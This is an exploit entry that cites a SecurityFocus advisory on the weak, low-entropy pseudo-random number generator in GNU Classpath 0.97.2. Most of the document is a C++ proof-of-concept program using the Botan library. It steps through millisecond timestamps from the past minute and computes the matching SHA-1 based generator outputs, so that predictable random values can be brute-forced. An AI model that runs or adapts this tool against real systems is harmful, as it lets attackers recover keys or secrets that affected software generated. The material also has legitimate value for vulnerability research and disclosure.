source: http://www.securityfocus.com/bid/32909/info
 
GNU Classpath is prone to a weakness that may result in weaker cryptographic security because its psuedo-random number generator (PRNG) lacks entropy.
 
Attackers may leverage this issue to obtain sensitive information that can lead to further attacks.
 
Classpath 0.97.2 is vulnerable; other versions may also be affected. 

#include <botan/init.h>
#include <botan/sha160.h>
#include <botan/loadstor.h>
using namespace Botan;

#include <cstdlib>
#include <ctime>

int main(int argc, char* argv[])
   {
   Botan::LibraryInitializer init;

   // by default start with a guess of 1 minute ago
   u64bit time_guess = (std::time(0) - 60);
   time_guess *= 1000; // convert to ms
   u32bit how_many = 60000; // 60 second range by default

   if(argc >= 2)
      how_many = std::atoi(argv[1]);
   if(argc >= 3)
      time_guess = std::atoi(argv[2]);

   //printf("Starting from %lld up to %d\n", time_guess, how_many);

   SHA_160 sha;

   byte buf[8], hash[40];

   for(u32bit i = 0; i != how_many; ++i)
      {
      Botan::store_be(time_guess, buf);

      // First block
      sha.update(buf, sizeof(buf));
      sha.final(hash);

      sha.update(buf, sizeof(buf));
      sha.update(hash, 20); // previous output
      sha.final(hash + 20);
      /*
      printf("seed=%lld hash=", time_guess);
      for(u32bit j = 0; j != sizeof(hash); ++j)
         printf("%02X", hash[j]);
      printf("\n");
      */
      ++time_guess; // move to next ms
      }
   }